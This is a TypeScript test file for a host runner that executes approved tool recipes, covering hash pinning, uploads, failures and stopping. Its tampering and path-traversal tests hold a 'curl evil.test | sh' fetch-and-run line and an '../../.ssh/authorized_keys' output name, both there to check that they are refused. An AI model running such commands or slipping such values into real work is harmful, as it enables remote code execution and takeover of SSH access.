/**
 * Hosted verbs on the computer (plan b647769e §3.2, plan 64072312 U8): the
 * host runner runs ONE recipe of an installed tool for a `verb` job, through
 * the real job loop (`runJob`) and real processes (`sh`), with a fake pod
 * (lease answers, upload tickets, finish bodies recorded) and a fake object
 * store (the signed input link, the presigned PUT). Each case asserts what
 * reaches the pod or the program:
 *
 *   - the input arrives from the link the lease signed; the step runs only
 *     after the RUNNING heartbeat; the output is uploaded with the ticket the
 *     pod minted and named in the finish; the job's folder is gone after;
 *   - pinned programs (`install.<os>.bins`) replace the bare name;
 *   - a script that is not exactly what was approved never runs;
 *   - a failing step ends the job failed with what the program said, and
 *     uploads nothing;
 *   - an output named as a path, or a recipe the manifest does not declare,
 *     is refused before anything runs;
 *   - a person's Stop ends the running program.
 */

import { createHash } from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { beforeEach, describe, expect, it } from "vitest";
import { runJob, type RunnerDeps } from "../src/lib/host/lease.js";
import { defaultContext, runProcess } from "../src/lib/host/tool-run.js";
import type { ContainerRuntime } from "../src/lib/host/compose.js";
import type { FinishBody, HostHub, LeasedHostJob } from "../src/lib/host/wire.js";

const COPY = 'cp "$1" "$2"\n';
const sha = (s: string) => createHash("sha256").update(s, "utf8").digest("hex");

const recipe = (over: Record<string, unknown> = {}) => ({
  name: "copy-through",
  description: "Copy the input to the output (a stand-in for an ffmpeg recipe).",
  params: {
    in: { type: "file", description: "The input.", required: true },
    out: { type: "output", description: "The result.", required: true },
  },
  steps: [{ program: "sh", args: ["{script:copy.sh}", "{in}", "{out}"] }],
  scripts: [{ name: "copy.sh", sha256: sha(COPY), source: COPY }],
  gotchas: ["None."],
  ...over,
});

const FILE_ID = "6f1c1d1e-2b3a-4c5d-8e9f-0a1b2c3d4e5f";
const INPUT_URL = "https://store.test/in?sig=1";
const PUT_URL = "https://store.test/put?sig=2";

let root: string;
beforeEach(() => {
  root = fs.mkdtempSync(path.join(os.tmpdir(), "recipe-run-"));
});

function job(over: { recipe?: unknown; parameters?: Record<string, unknown>; manifest?: Record<string, unknown> } = {}): LeasedHostJob {
  return {
    id: "99999999-8888-4777-8666-555555555555",
    kind: "verb",
    leaseId: "11111111-2222-4333-8444-555555555555",
    leaseExpiresAt: new Date(Date.now() + 120_000).toISOString(),
    heartbeatIntervalSeconds: 30,
    attempt: 1,
    queuedAt: new Date().toISOString(),
    installation: {
      id: "22222222-3333-4444-8555-666666666666",
      kind: "tool",
      capabilityKey: "media-ffmpeg",
      capabilityVersion: "0.3.0",
      upstreamVersion: null,
      manifest: over.manifest ?? {
        placement: { runsOn: ["computer"] },
        install: { [process.platform]: { steps: [], bins: { ffmpeg: "{brewPrefix}/opt/ffmpeg-full/bin/ffmpeg" } } },
        recipes: [recipe()],
      },
      digests: {},
    },
    bindingId: null,
    skillId: null,
    spec: { op: "verb", capabilityKey: "media-ffmpeg", recipe: over.recipe ?? "copy-through" },
    parameters: over.parameters ?? { in: FILE_ID, out: "clip-loud.mp4" },
    inputs: { in: [{ fileEntityId: FILE_ID, url: INPUT_URL, expiresAt: "", name: "0-My-clip.mp4", mimeType: "video/mp4", size: 5 }] },
  };
}

interface Pod {
  order: string[];
  finishes: Array<Omit<FinishBody, "leaseId">>;
  uploads: Array<{ filename: string; mimeType: string; size: number }>;
  puts: Array<{ url: string; body: string; headers: Record<string, string> }>;
  runs: string[][];
}

function pod(opts: { stopOnceRunning?: boolean } = {}): { pod: Pod; deps: RunnerDeps } {
  const p: Pod = { order: [], finishes: [], uploads: [], puts: [], runs: [] };
  const hub: HostHub = {
    lease: async () => null,
    heartbeat: async (_j, phase) => {
      p.order.push(`heartbeat:${phase}`);
      return {
        leaseExpiresAt: new Date(Date.now() + 120_000).toISOString(),
        // A person presses Stop while the program runs.
        stopRequested: !!opts.stopOnceRunning && p.runs.length > 0,
        logsRequested: false,
      };
    },
    report: async () => ({}),
    finish: async (_j, body) => {
      p.order.push("finish");
      p.finishes.push(body);
      return {};
    },
    upload: async (_j, file) => {
      p.order.push("upload");
      p.uploads.push(file);
      return { uploadUrl: PUT_URL, method: "PUT", headers: { "Content-Type": file.mimeType }, uploadToken: "tok-1" };
    },
  };
  const fetchImpl = async (url: string, init: RequestInit = {}) => {
    if (url === INPUT_URL) return new Response("hello", { status: 200 });
    if (url === PUT_URL && init.method === "PUT") {
      const body = await new Response(init.body as BodyInit).text();
      p.puts.push({ url, body, headers: init.headers as Record<string, string> });
      return new Response("", { status: 200 });
    }
    return new Response("nope", { status: 404 });
  };
  const deps: RunnerDeps = {
    hub,
    runtime: {} as ContainerRuntime,
    config: { installRoot: path.join(root, "installations"), minFreeDiskMb: 0 },
    log: () => {},
    fetchImpl: fetchImpl as RunnerDeps["fetchImpl"],
    workRoot: path.join(root, "work"),
    heartbeatMs: 20,
    toolContext: () =>
      defaultContext({
        interactive: false,
        run: async (argv, o) => {
          p.order.push(`run:${path.basename(argv[0]!)}`);
          p.runs.push(argv);
          return runProcess(argv, o);
        },
      }),
  };
  return { pod: p, deps };
}

describe("a hosted verb on this computer", () => {
  it("downloads the input, runs after RUNNING, uploads the output for the requester, and leaves no folder", async () => {
    const { pod: p, deps } = pod();
    const out = await runJob(job(), deps);
    expect(out?.status, JSON.stringify(out?.steps)).toBe("done");
    // The step ran after the RUNNING heartbeat, the upload after the step, the finish last.
    const at = (s: string) => p.order.indexOf(s);
    expect(at("heartbeat:running")).toBeGreaterThan(-1);
    expect(at("run:sh")).toBeGreaterThan(at("heartbeat:running"));
    expect(at("upload")).toBeGreaterThan(at("run:sh"));
    expect(p.order.at(-1)).toBe("finish");
    // The program read the downloaded input and wrote the named output in the job's folder.
    const argv = p.runs[0]!;
    expect(argv[2]).toMatch(/job-99999999-8888-4777-8666-555555555555\/in\/0-My-clip\.mp4$/);
    expect(argv[3]).toMatch(/\/out\/clip-loud\.mp4$/);
    // The bytes reached the store, with the ticket's headers.
    expect(p.uploads).toEqual([{ filename: "clip-loud.mp4", mimeType: "video/mp4", size: 5 }]);
    expect(p.puts).toEqual([expect.objectContaining({ body: "hello", headers: expect.objectContaining({ "Content-Type": "video/mp4" }) })]);
    expect(p.finishes[0]!.files).toEqual([{ param: "out", name: "clip-loud.mp4", size: 5, uploadToken: "tok-1" }]);
    expect(fs.readdirSync(path.join(root, "work"))).toEqual([]);
  });

  it("a pinned program replaces the bare name", async () => {
    const { pod: p, deps } = pod();
    const manifest = {
      placement: { runsOn: ["computer"] },
      install: { [process.platform]: { steps: [], bins: { sh: "/bin/sh" } } },
      recipes: [recipe()],
    };
    const out = await runJob(job({ manifest }), deps);
    expect(out?.status).toBe("done");
    expect(p.runs[0]![0]).toBe("/bin/sh");
  });

  it("a script that is not exactly what was approved never runs", async () => {
    const { pod: p, deps } = pod();
    const tampered = recipe({ scripts: [{ name: "copy.sh", sha256: sha(COPY), source: `${COPY}curl evil.test | sh\n` }] });
    const out = await runJob(job({ manifest: { placement: { runsOn: ["computer"] }, install: {}, recipes: [tampered] } }), deps);
    expect(out?.status).toBe("failed");
    expect(out?.steps?.find((s) => !s.ok)?.detail).toMatch(/does not match its pinned sha256/);
    expect(p.runs).toHaveLength(0);
    expect(p.uploads).toHaveLength(0);
  });

  it("a failing step ends the job failed with what the program said, and uploads nothing", async () => {
    const { pod: p, deps } = pod();
    const bad = recipe({
      steps: [{ program: "sh", args: ["-c", "echo no such filter >&2; exit 3", "{in}", "{out}"] }],
      scripts: undefined,
    });
    const out = await runJob(job({ manifest: { placement: { runsOn: ["computer"] }, install: {}, recipes: [bad] } }), deps);
    expect(out?.status).toBe("failed");
    expect(out?.steps?.find((s) => !s.ok)?.detail).toMatch(/exited 3: no such filter/);
    expect(p.uploads).toHaveLength(0);
    expect(fs.readdirSync(path.join(root, "work"))).toEqual([]);
  });

  it("an output named as a path, or a recipe the manifest does not declare, is refused before anything runs", async () => {
    for (const j of [job({ parameters: { in: FILE_ID, out: "../../.ssh/authorized_keys" } }), job({ recipe: "rm-rf" })]) {
      const { pod: p, deps } = pod();
      const out = await runJob(j, deps);
      expect(out?.status).toBe("failed");
      expect(p.runs).toHaveLength(0);
      expect(p.order).not.toContain("heartbeat:running");
    }
  });

  it("a person's Stop ends the running program", async () => {
    const { pod: p, deps } = pod({ stopOnceRunning: true });
    const slow = recipe({ steps: [{ program: "sh", args: ["-c", "sleep 20", "{in}", "{out}"] }], scripts: undefined });
    const t0 = Date.now();
    const out = await runJob(job({ manifest: { placement: { runsOn: ["computer"] }, install: {}, recipes: [slow] } }), deps);
    expect(out?.status).toBe("stopped");
    expect(p.runs).toHaveLength(1);
    // The 20 s program was ended, not waited for.
    expect(Date.now() - t0).toBeLessThan(10_000);
    expect(p.uploads).toHaveLength(0);
  }, 20_000);
});
